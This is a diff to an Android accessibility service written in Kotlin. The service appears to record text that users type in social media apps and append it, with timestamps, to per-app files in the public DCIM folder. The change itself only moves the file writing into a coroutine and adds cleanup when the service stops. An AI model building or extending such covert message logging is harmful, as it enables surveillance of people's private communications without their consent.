@@ -9,6 +9,7 @@ import android.view.KeyEvent
 import android.view.accessibility.AccessibilityEvent
 import android.widget.Toast
 import com.example.accessibilityversion_2.util.Util
+import kotlinx.coroutines.*
 import java.io.File
 import java.io.FileWriter
 import java.text.SimpleDateFormat
@@ -20,6 +21,8 @@ class MyAccessibilityService : AccessibilityService() {
 
     private var previousMessage = "";
     private val TAG = "MyService"
+
+    private lateinit var job: Job;
 
     override fun onServiceConnected() {
         Log.e(TAG, "onServiceConnected: Service is connected...")
@@ -42,7 +45,6 @@ class MyAccessibilityService : AccessibilityService() {
                 previousMessage = inputText;
             }
         }
-
     }
 
     private fun checkingSocialMediaPackages(event: AccessibilityEvent): Boolean {
@@ -54,23 +56,25 @@ class MyAccessibilityService : AccessibilityService() {
 
 
     private fun savingMessagesWithAppName(message: String, appName: String) {
-        val file = creatingNewFileOrReturnOldOne(appName);
-        Log.e(TAG, "savingMessagesWithAppName: ${file?.length()}")
+        job = CoroutineScope(Dispatchers.IO).launch {
+            val file = creatingNewFileOrReturnOldOne(appName);
+            Log.e(TAG, "savingMessagesWithAppName: ${file?.length()}")
 
-        val fileWriter = FileWriter(file?.absolutePath, true);
-        val formatter = SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
-        val date = Date();
-        fileWriter.write(
-            "\n Сообщение: $message  Время: ${
-                formatter.format(
-                    date
-                )
-            }",
-        )
-        fileWriter.close();
+            val fileWriter = FileWriter(file?.absolutePath, true);
+            val formatter = SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
+            val date = Date();
+            fileWriter.write(
+                "\n Сообщение: $message  Время: ${
+                    formatter.format(
+                        date
+                    )
+                }",
+            )
+            fileWriter.close();
+        }
     }
 
-    private fun creatingNewFileOrReturnOldOne(appName: String): File? {
+    private suspend fun creatingNewFileOrReturnOldOne(appName: String): File? {
 
         val file = File(
             Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
@@ -136,6 +140,11 @@ class MyAccessibilityService : AccessibilityService() {
 
     override fun onInterrupt() {
 
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        if (this::job.isInitialized) job.cancel();
     }
 
 
